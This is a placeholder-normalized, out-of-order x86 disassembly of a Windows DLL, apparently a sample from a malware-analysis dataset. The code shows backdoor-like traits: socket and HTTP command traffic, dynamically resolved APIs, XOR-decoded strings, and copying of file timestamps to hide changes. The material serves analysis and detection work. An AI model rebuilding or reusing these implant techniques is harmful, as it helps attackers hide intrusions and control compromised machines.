push 0x400
lea ebx [ esp + 0x38c ]
call sub_10007ad0
add esp 0x8
test eax eax
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov [ edi + 0x1434 ] ebp
jmp r-xdata
sub_10007320
push edi
mov edi r--data
mov [ rw-data ] 0x0
call sub_100060d0
pop edi
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0xc ]
push edx
mov edx [ ecx + 0x8 ]
push edx
mov edx [ ecx + 0x4 ]
mov ecx [ ecx ]
push edx
push ecx
call eax
xor edx edx
test eax eax
setne dl
mov [ rw-data ] eax
mov eax edx
retn 0x4
retn 0x4
sub_10007370
sub esp 0x22c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x228 ] eax
push ebx
push ebp
push esi
mov esi ecx
mov ecx 0x1
mov ebx edx
mov [ esp + 0xc ] ebx
cmp [ rw-data ] ecx
jne r-xdata
cmp [ esi + 0x428 ] ecx
jne r-xdata
mov eax [ esp + 0x23c ]
mov [ esp + 0x1c ] ebx
xor ebx ebx
push 0x104
lea ecx [ esp + 0x12d ]
push ebx
push ecx
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] eax
mov [ rw-data ] ebx
mov [ esp + 0x134 ] bl
call sub_1000ebe0
push 0x104
lea edx [ esp + 0x31 ]
push ebx
push edx
mov [ esp + 0x38 ] bl
call sub_1000ebe0
add esp 0x18
mov ecx r--data
lea edx [ esp + 0x128 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x20 ]
call sub_100029c0
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x12c ]
push ecx
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x42c ]
test eax eax
jle r-xdata
mov eax [ esi + 0x42c ]
lea ebp [ esi + 0x42c ]
test eax eax
jge r-xdata
xor eax eax
jmp r-xdata
lea edx [ esp + 0xc ]
push edx
push ebx
lea ecx [ esp + 0x18 ]
push ecx
push sub_10007320
push ebx
push ebx
call eax
mov esi eax
push 0xea60
push esi
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
jge r-xdata
mov ecx [ esp + 0x23c ]
cmp eax ecx
push 0x0
jle r-xdata
jle r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x8 ]
push eax
push 0x100
lea ebx [ esp + 0x28 ]
call sub_10007ad0
push ebp
mov ecx ebx
push r--data
push ecx
call sub_1000dca0
mov eax [ ebp ]
add esp 0x14
test eax eax
jne r-xdata
mov ecx [ esp + 0x234 ]
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x22c
retn 0x4
mov eax [ rw-data ]
jmp r-xdata
push ebx
push esi
call [ TerminateThread@IAT ]
mov [ ebx ] 0x0
mov eax ecx
mov edx [ esp + 0x23c ]
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x8 ]
push 0x0
push edx
push edi
push ecx
call recv
test eax eax
jle r-xdata
push eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x8 ]
push edi
push ecx
push ecx
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x8 ]
push edi
push edx
jmp r-xdata
mov ecx [ esp + 0x23c ]
cmp eax ecx
push 0x0
jle r-xdata
mov ebx [ esp + 0xc ]
test eax eax
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x8 ]
push eax
push 0x100
call sub_10007ad0
add esp 0x8
xor eax eax
jmp r-xdata
mov [ ebx ] eax
mov eax 0x1
jmp r-xdata
mov [ ebx ] eax
sub [ esi + 0x42c ] eax
mov eax 0x1
jmp r-xdata
call recv
test eax eax
jl r-xdata
push eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x8 ]
push edi
push ecx
push ecx
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x8 ]
push edi
push edx
jmp r-xdata
mov [ ebx ] eax
sub [ ebp ] eax
jne r-xdata
call recv
test eax eax
jl r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x8 ]
push eax
push 0x100
lea ebx [ esp + 0x28 ]
call sub_10007ad0
add esp 0x8
mov [ ebp ] 0xffffffff
sub_100075d0
cmp [ rw-data ] 0x1
jne r-xdata
push 0x0
push eax
mov eax [ edx + 0x4 ]
push ecx
mov ecx [ eax + 0x8 ]
push ecx
call send
test eax eax
jge r-xdata
push esi
push eax
push ecx
push edx
call [ InternetWriteFile@IAT ]
retn
mov [ esi ] eax
mov eax 0x1
retn
xor eax eax
retn
sub_10007610
cmp [ rw-data ] 0x1
jne r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
mov edi edi
push 0xa0000000
push 0xffffffff
push ebx
push edi
call [ HttpAddRequestHeadersA@IAT ]
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push esi
mov esi eax
mov eax [ edi + 0x1430 ]
mov ecx 0x1000
sub ecx eax
cmp ecx esi
jge r-xdata
push esi
lea edx [ eax + edi + 0x430 ]
push ebx
push edx
call sub_10013da0
add [ edi + 0x1430 ] esi
add esp 0xc
mov eax 0x1
pop esi
retn
xor eax eax
pop esi
retn
sub_10007670
sub esp 0x4c4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4c0 ] eax
push ebp
mov ebp 0x1
cmp [ rw-data ] ebp
jne r-xdata
push ebx
push edi
xor ebx ebx
push 0x3f
lea eax [ esp + 0x91 ]
push ebx
push eax
mov edi ebp
mov [ esp + 0x98 ] bl
call sub_1000ebe0
push 0x3f
lea ecx [ esp + 0x1d ]
push ebx
push ecx
mov [ esp + 0x24 ] bl
call sub_1000ebe0
push 0x3f
lea edx [ esp + 0x69 ]
push ebx
push edx
mov [ esp + 0x70 ] bl
call sub_1000ebe0
add esp 0x24
mov [ esi + 0x1430 ] ebx
mov ecx r--data
lea eax [ esi + 0x8 ]
push 0x0
push 0x0
push 0x0
push esi
call [ HttpEndRequestA@IAT ]
pop ebp
mov ecx [ esp + 0x4c0 ]
xor ecx esp
call sub_1000c176
add esp 0x4c4
retn
sbb eax eax
sbb eax 0xffffffff
cmp dl bl
je r-xdata
mov ecx [ esp + 0x4cc ]
mov eax edi
pop edi
pop ebx
pop ebp
xor ecx esp
call sub_1000c176
add esp 0x4c4
retn
push 0x12c
call [ Sleep@IAT ]
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x8 ]
push ecx
push 0x400
lea ebx [ esp + 0xd4 ]
call sub_10007ad0
add esp 0x8
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
pop edi
pop ebx
mov [ esi + 0x1434 ] ebp
xor eax eax
pop ebp
mov ecx [ esp + 0x4c0 ]
xor ecx esp
call sub_1000c176
add esp 0x4c4
retn
lea esp [ esp ]
cmp eax ebx
jne r-xdata
add eax 0x2
add ecx 0x2
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
lea ecx [ esp + 0xcc ]
push r--data
push ecx
call sub_1000c5d4
push r--data
push 0x0
call sub_1000c5d4
add esp 0x10
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x8 ]
push eax
push 0x400
lea ebx [ esp + 0xd4 ]
call sub_10007ad0
add esp 0x8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
push eax
call sub_1000d6ae
add esp 0x4
cmp eax 0xc8
je r-xdata
mov [ esi + 0x1434 ] ebp
jmp r-xdata
mov ecx r--data
lea eax [ esp + 0xcc ]
lea esp [ esp ]
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov ecx r--data
lea edx [ esp + 0x8c ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0xc ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x4c ]
call sub_100029c0
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x8 ]
push eax
push 0x400
lea ebx [ esp + 0xd4 ]
call sub_10007ad0
add esp 0x8
test eax eax
je r-xdata
xor edi edi
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
jmp r-xdata
mov ecx r--data
lea eax [ esp + 0xcc ]
lea esp [ esp ]
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
push 0xe
lea ecx [ esp + 0x90 ]
push ecx
lea edx [ esp + 0xd4 ]
push edx
call sub_1000db40
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
push 0x1a
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0xd4 ]
push edx
call sub_1000db40
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0xdb ]
push eax
call sub_1000d698
add esp 0x4
mov [ esi + 0x42c ] eax
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
push 0x11
lea eax [ esp + 0x50 ]
push eax
lea ecx [ esp + 0xd4 ]
push ecx
call sub_1000db40
add esp 0xc
test eax eax
jne r-xdata
mov [ esi + 0x428 ] ebp
jmp r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x8 ]
push eax
push 0x400
lea ebx [ esp + 0xd4 ]
call sub_10007ad0
add esp 0x8
test eax eax
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov [ esi + 0x1434 ] ebp
sub_10007970
mov eax 0x1
push ebp
mov ebp [ esp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
cmp [ esi + 0x428 ] eax
je r-xdata
push edi
mov edi r--data
call sub_100060d0
pop edi
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn 0x4
mov ecx [ esi + 0x42c ]
mov [ ebp ] ecx
mov [ ebx ] 0x4
pop ebp
retn 0x4
push 0x0
push ebx
push ebp
push 0x20000005
push esi
call eax
pop ebp
retn 0x4
sub_100079d0
sub esp 0x19c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x194 ] eax
lea eax [ esp ]
push eax
push 0x202
call WSAStartup
mov ecx [ esp + 0x194 ]
neg eax
sbb eax eax
xor ecx esp
call sub_1000c176
add esp 0x19c
retn
sub_10007a10
sub esp 0x18
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x14 ] eax
push esi
push edi
mov esi ecx
call sub_100079d0
test eax eax
jge r-xdata
push esi
call inet_addr
mov edi eax
mov [ esp + 0x8 ] edi
cmp edi 0xffffffff
jne r-xdata
xor eax eax
pop edi
pop esi
mov ecx [ esp + 0x14 ]
xor ecx esp
call sub_1000c176
add esp 0x18
retn
test ebx ebx
je r-xdata
push esi
call gethostbyname
test eax eax
je r-xdata
push 0x6
push 0x1
push 0x2
call socket
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov [ ebx ] edi
movsx ecx [ eax + 0xa ]
mov edx [ eax + 0xc ]
mov eax [ edx ]
push ecx
push eax
lea ecx [ esp + 0x10 ]
push ecx
call sub_10013da0
mov edi [ esp + 0x14 ]
add esp 0xc
mov eax [ esp + 0x24 ]
mov edx 0x2
push eax
mov [ esp + 0x10 ] dx
mov [ esp + 0x14 ] edi
call htons
push 0x10
lea ecx [ esp + 0x10 ]
push ecx
push esi
mov [ esp + 0x1a ] ax
call connect
mov ecx [ esp + 0x1c ]
inc eax
neg eax
sbb eax eax
and eax esi
pop edi
pop esi
xor ecx esp
call sub_1000c176
add esp 0x18
retn
sub_10007ad0
push ebp
mov ebp [ esp + 0xc ]
push esi
xor esi esi
cmp [ esp + 0xc ] esi
push edi
jle r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ ebx + eax ] 0x0
mov eax ebx
pop ebp
retn
nop
pop edi
pop esi
xor eax eax
pop ebp
retn
cmp [ edi ] 0xa
je r-xdata
pop edi
mov [ esi + ebx + 0x1 ] 0x0
pop esi
mov eax ebx
pop ebp
retn
inc esi
cmp esi [ esp + 0x10 ]
jl r-xdata
push 0x0
push 0x1
lea edi [ esi + ebx ]
push edi
push ebp
call recv
test eax eax
jle r-xdata
sub_10007b20
push esi
mov ecx eax
push edi
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
dec ecx
sub ecx 0x1
mov [ ecx + eax + 0x1 ] 0x0
jns r-xdata
cmp dl 0x9
jne r-xdata
mov dl [ ecx + eax ]
cmp dl 0x20
je r-xdata
mov esi eax
push ebx
xor ecx ecx
xor edi edi
lea ebx [ esi + 0x1 ]
mov dl [ esi ]
inc esi
test dl dl
jne r-xdata
sub esi ebx
pop ebx
lea esp [ esp ]
inc ecx
cmp ecx esi
jl r-xdata
cmp dl 0x9
jne r-xdata
mov dl [ ecx + eax ]
cmp dl 0x20
je r-xdata
test ecx ecx
je r-xdata
pop edi
pop esi
retn
cmp ecx esi
jge r-xdata
mov [ edi + eax ] 0x0
lea ebx [ ebx ]
mov dl [ ecx + eax ]
mov [ edi + eax ] dl
inc ecx
inc edi
cmp ecx esi
jl r-xdata
sub_10007ba0
push ecx
test esi esi
jne r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
mov edi edi
xor eax eax
pop ecx
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov edx edi
mov eax esi
sub edx esi
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
dec eax
test eax eax
jle r-xdata
mov eax 0x1
pop ecx
retn
mov edi edi
mov [ eax + edi ] 0x0
dec eax
test eax eax
jg r-xdata
cmp [ eax + edi ] 0x5c
je r-xdata
mov eax 0x1
pop ecx
retn
sub_10007c00
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov eax ebp
push edi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
mov eax [ esp + 0x18 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebx eax
mov eax 0x1
sub eax ebx
add esi eax
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
lea esp [ esp ]
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
inc edi
inc ebp
cmp edi esi
jl r-xdata
mov ecx [ esp + 0x18 ]
push ebx
push ecx
push ebp
call sub_1000e13b
add esp 0xc
test eax eax
je r-xdata
sub_10007c70
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x84 ] eax
push ebx
push esi
push edi
mov edi edx
mov eax ecx
mov [ esp + 0xc ] edi
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edx [ r--data ]
sub eax esi
mov ebx eax
mov eax [ r--data ]
mov [ esp + 0x10 ] eax
mov ax [ r--data ]
xor esi esi
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] ax
test ebx ebx
jle r-xdata
mov ecx [ esp + 0x90 ]
mov [ edi + esi ] 0x0
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x88
retn
sub edi ecx
push ebp
mov [ edi + ecx ] al
inc esi
inc ecx
cmp esi ebx
jl r-xdata
xor al dl
mov eax esi
cdq
mov ebp 0x9
idiv ebp
mov al [ ecx ]
mov dl [ esp + edx + 0x14 ]
cmp al dl
je r-xdata
mov ecx [ esp + 0x10 ]
pop ebp
pop edi
mov [ ecx + esi ] 0x0
pop esi
pop ebx
mov ecx [ esp + 0x84 ]
xor ecx esp
call sub_1000c176
add esp 0x88
retn
sub_10007d20
push ecx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi eax
mov eax ebp
push edi
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
xor edi edi
cmp [ esp + 0x18 ] edi
mov [ esp + 0xc ] eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ecx
retn
push ebx
mov ebx [ esp + 0x18 ]
sub ebx esi
lea esp [ esp ]
mov [ ebx + esi ] cl
inc edi
inc esi
cmp edi [ esp + 0x1c ]
jl r-xdata
mov eax edi
cdq
idiv [ esp + 0x10 ]
mov dl [ edx + ebp ]
cmp cl dl
je r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
pop ebx
xor cl dl
sub_10007d80
sub esp 0x104
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x100 ] eax
push ebp
mov ebp [ esp + 0x10c ]
push edi
mov edi [ CreateDirectoryA@IAT ]
push 0x0
push ebp
call edi
test eax eax
je r-xdata
lea edx [ esp + 0x8 ]
mov eax ebp
sub edx ebp
pop edi
mov eax 0x1
pop ebp
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_1000c176
add esp 0x104
retn
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
dec eax
test eax eax
jle r-xdata
pop edi
xor eax eax
pop ebp
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_1000c176
add esp 0x104
retn
cmp [ esp + eax + 0x8 ] 0x5c
je r-xdata
mov [ esp + eax + 0x8 ] 0x0
test eax eax
jle r-xdata
dec eax
test eax eax
jg r-xdata
push 0x0
lea eax [ esp + 0xc ]
push eax
call edi
test eax eax
je r-xdata
lea eax [ esp + 0x8 ]
lea edx [ eax + 0x1 ]
lea eax [ esp + 0x8 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push esi
push 0x0
lea ecx [ esp + 0x10 ]
sub eax edx
push ecx
mov [ esp + eax + 0x14 ] 0x5c
call edi
test eax eax
je r-xdata
pop esi
pop edi
xor eax eax
pop ebp
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_1000c176
add esp 0x104
retn
lea eax [ esp + 0xc ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edx eax
mov eax ebp
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
cmp edx eax
jae r-xdata
mov ecx [ esp + 0x10c ]
pop esi
pop edi
pop ebp
xor ecx esp
mov eax 0x1
call sub_1000c176
add esp 0x104
retn
lea eax [ esp + 0xc ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push 0x0
lea edx [ esp + 0x10 ]
push edx
mov [ esp + eax + 0x14 ] 0x5c
call edi
test eax eax
jne r-xdata
sub_10007f00
push esi
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
retn
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
push 0xc0000000
push esi
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax 0x1
retn
sub_10007f40
sub esp 0x268
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x264 ] eax
mov eax [ esp + 0x26c ]
push ebx
push ebp
push esi
push edi
push 0x104
lea ecx [ esp + 0x64 ]
push ecx
mov [ esp + 0x1c ] eax
call [ GetWindowsDirectoryA@IAT ]
mov ecx r--data
lea edx [ esp + 0x168 ]
call sub_10007c70
lea edi [ esp + 0x60 ]
dec edi
lea esp [ esp ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov dx [ r--data ]
lea eax [ esp + 0x168 ]
mov [ edi ] dx
mov esi eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x60 ]
sub eax esi
dec edi
mov edi edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
push 0x0
push 0x80
push 0x3
push 0x0
mov ecx eax
push 0x1
and ecx 0x3
push 0x80000000
lea eax [ esp + 0x78 ]
[ edi ] [ esi ]
mov edi [ CreateFileA@IAT ]
push eax
call edi
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov ecx [ esp + 0x274 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x268
retn
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x30 ]
push eax
push esi
call [ GetFileTime@IAT ]
mov ebx [ CloseHandle@IAT ]
mov ebp [ Sleep@IAT ]
test eax eax
je r-xdata
push esi
call ebx
push 0x64
call ebp
push esi
call ebx
mov ecx [ esp + 0x14 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x40000000
push ecx
call edi
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov edi [ FileTimeToSystemTime@IAT ]
lea edx [ esp + 0x30 ]
push edx
lea eax [ esp + 0x2c ]
push eax
call edi
lea ecx [ esp + 0x50 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
call edi
lea eax [ esp + 0x40 ]
push eax
lea ecx [ esp + 0x24 ]
push ecx
call edi
lea edx [ esp + 0x18 ]
push edx
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x30 ]
push ecx
push esi
call [ SetFileTime@IAT ]
test eax eax
je r-xdata
push esi
call [ FlushFileBuffers@IAT ]
push 0x64
call ebp
sub_100080c0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov esi eax
xor ebx ebx
xor edi edi
test esi esi
jbe r-xdata
push ebp
call sub_1000d218
add esp 0x4
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
retn
movzx eax si
cmp esi 0x7530
jbe r-xdata
movzx eax ax
push ebp
push eax
sub esi eax
mov eax [ esp + 0x1c ]
lea ecx [ edi + eax ]
push 0x1
push ecx
call sub_1000d3d6
movzx eax ax
add esp 0x10
add edi eax
add ebx eax
test esi esi
ja r-xdata
mov eax 0x7530
sub_10008120
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov esi eax
xor ebx ebx
xor edi edi
test esi esi
jbe r-xdata
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
retn
movzx eax si
cmp esi 0x7530
jbe r-xdata
movzx eax ax
push ebp
push eax
sub esi eax
mov eax [ esp + 0x1c ]
lea ecx [ edi + eax ]
push 0x1
push ecx
call sub_1000ca10
movzx eax ax
add esp 0x10
add edi eax
add ebx eax
test esi esi
ja r-xdata
mov eax 0x7530
sub_10008170
sub esp 0x18
call sub_10008250
test eax eax
jl r-xdata
or eax 0xffffffff
add esp 0x18
retn
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp ] edx
lea edx [ esp ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x10 ] ecx
mov ecx [ esi ]
push edx
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0xc ] ecx
call sub_10008300
add esp 0x8
test eax eax
jge r-xdata
call sub_100082b0
mov ecx [ esp + 0x8 ]
mov [ esi ] ecx
xor eax eax
add esp 0x18
retn
call sub_100082b0
sub_100081e0
sub esp 0x18
call sub_10008250
test eax eax
jl r-xdata
or eax 0xffffffff
add esp 0x18
retn
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp ] edx
lea edx [ esp ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x10 ] ecx
mov ecx [ esi ]
push edx
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0xc ] ecx
call sub_10008440
add esp 0x8
test eax eax
jge r-xdata
call sub_100082b0
mov ecx [ esp + 0x8 ]
mov [ esi ] ecx
xor eax eax
add esp 0x18
retn
call sub_100082b0
sub_10008250
cmp [ rw-data ] 0x0
je r-xdata
push esi
push edi
push 0x4e74
call sub_1000cef2
mov esi eax
push 0x4e74
mov [ rw-data ] esi
call sub_1000cef2
mov edi eax
push 0x139d
mov [ rw-data ] edi
call sub_1000cef2
add esp 0xc
mov [ rw-data ] eax
test esi esi
je r-xdata
xor eax eax
retn
pop edi
or eax 0xffffffff
pop esi
retn
test edi edi
je r-xdata
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_100082b0
mov eax [ rw-data ]
push eax
call sub_1000c3e9
mov ecx [ rw-data ]
push ecx
call sub_1000c3e9
mov edx [ rw-data ]
push edx
call sub_1000c3e9
xor eax eax
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_10008300
push ecx
push ebx
push ebp
mov ebp [ rw-data ]
push esi
push edi
test ebp ebp
jne r-xdata
or eax 0xffffffff
mov ecx 0x139d
mov edi ebp
[ edi ]
mov edi [ esp + 0x18 ]
mov eax [ edi + 0x8 ]
cmp [ edi + 0x4 ] eax
mov esi 0x100
mov [ esp + 0x10 ] esi
jg r-xdata
call sub_10008250
mov ebp [ rw-data ]
mov ecx [ edi ]
movzx ecx [ ecx + eax ]
inc eax
mov [ edi + 0x8 ] eax
or ecx 0xffffffff
jmp r-xdata
mov esi [ esp + 0x1c ]
call sub_10008650
mov eax 0xfff
call sub_10008650
xor eax eax
call sub_10008650
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov edx [ edi ]
movzx ebx [ edx + ecx ]
inc ecx
mov [ edi + 0x8 ] ecx
cmp ebx 0xffffffff
je r-xdata
mov eax ecx
lea esp [ esp ]
mov ecx ebx
shl ecx 0x4
xor ecx eax
jne r-xdata
mov edx 0x139d
sub edx ecx
lea edx [ ecx + 0x1 ]
jmp r-xdata
mov edx [ ebp + ecx * 4 ]
cmp edx 0xffffffff
je r-xdata
jmp r-xdata
cmp [ ebp + ecx * 4 ] 0xffffffff
je r-xdata
cmp esi 0xffe
ja r-xdata
mov eax edx
jmp r-xdata
mov edi [ rw-data ]
cmp [ edi + ecx * 4 ] eax
jne r-xdata
mov esi [ esp + 0x1c ]
call sub_10008650
test eax eax
jl r-xdata
mov edx [ rw-data ]
mov [ ebp + ecx * 4 ] esi
mov [ edx + ecx * 4 ] eax
mov edx [ rw-data ]
inc esi
mov [ esp + 0x10 ] esi
mov [ edx + ecx ] bl
mov ecx [ edi + 0x8 ]
cmp [ edi + 0x4 ] ecx
jle r-xdata
sub ecx edx
jns r-xdata
mov edi [ rw-data ]
movzx edi [ edi + ecx ]
cmp edi ebx
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
mov esi [ esp + 0x10 ]
mov eax ebx
jmp r-xdata
cmp [ ebp + ecx * 4 ] 0xffffffff
jne r-xdata
add ecx 0x139d
mov edi [ esp + 0x18 ]
sub_10008440
sub esp 0x14
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x28 ]
mov [ esp + 0x14 ] 0x100
call sub_100085e0
mov ecx [ esp + 0x2c ]
mov edx eax
mov eax [ ecx + 0x8 ]
cmp [ ecx + 0x4 ] eax
mov [ esp + 0x18 ] edx
mov [ esp + 0x10 ] edx
jle r-xdata
call sub_10008250
call sub_100085e0
mov edi eax
mov [ esp + 0x1c ] edi
cmp edi 0xfff
je r-xdata
mov esi [ ecx ]
mov [ eax + esi ] dl
inc eax
mov [ ecx + 0x8 ] eax
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
mov ebp [ rw-data ]
mov ebx [ rw-data ]
mov ecx edi
mov edx rw-data
cmp edi 0xff
jbe r-xdata
mov ecx [ esp + 0x18 ]
mov al [ esp + 0x10 ]
mov [ rw-data ] al
mov edx rw-data
cmp ecx 0xff
jbe r-xdata
mov [ edx ] cl
movzx ecx [ edx ]
mov [ esp + 0x10 ] ecx
cmp edx rw-data
jb r-xdata
mov al [ ebx + ecx ]
mov ecx [ ebp + ecx * 4 ]
mov [ edx ] al
mov eax esi
inc edx
inc esi
cmp eax 0xffe
jge r-xdata
lea ebx [ ebx ]
mov eax [ esp + 0x14 ]
cmp eax 0xffe
ja r-xdata
mov eax [ esp + 0x2c ]
mov esi [ eax + 0x4 ]
lea esp [ esp ]
push r--data
call sub_1000e5aa
add esp 0x4
push 0xfffffffd
call sub_1000e90f
cmp ecx 0xff
ja r-xdata
cmp ecx 0xff
ja r-xdata
mov [ esp + 0x18 ] edi
mov edi [ esp + 0x28 ]
call sub_100085e0
mov edi eax
mov [ esp + 0x1c ] eax
cmp edi 0xfff
jne r-xdata
mov ecx [ esp + 0x18 ]
mov dl [ esp + 0x10 ]
mov [ ebp + eax * 4 ] ecx
mov [ ebx + eax ] dl
inc eax
mov [ esp + 0x14 ] eax
mov eax [ eax ]
mov edi [ esp + 0x1c ]
mov [ esp + 0x20 ] edx
mov dl [ edx ]
mov [ ecx + eax ] dl
mov eax [ esp + 0x2c ]
mov edx [ esp + 0x20 ]
inc ecx
mov [ eax + 0x8 ] ecx
xor ecx ecx
or ecx 0xffffffff
jmp r-xdata
